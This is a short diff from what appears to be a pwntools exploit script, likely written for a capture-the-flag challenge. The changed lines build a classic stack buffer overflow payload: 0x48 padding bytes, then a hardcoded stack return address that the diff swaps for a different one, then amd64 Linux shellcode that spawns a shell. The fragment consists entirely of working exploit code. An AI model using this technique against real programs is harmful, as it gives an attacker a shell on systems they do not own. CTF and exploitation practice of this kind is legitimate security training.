@@ -27,7 +27,7 @@ def main():
 	# good luck pwning :)
 
 	payload = b"A"*(0x48)
-	payload += p64(0x7fffffffddc0 + 0x50) # dependant on ur environment - might nto work lcoally bc we hardcoding ir
+	payload += p64(0x007fffffffdaa0) # dependant on ur environment - might nto work lcoally bc we hardcoding ir
 	payload += asm(shellcraft.amd64.linux.sh())
 	
 
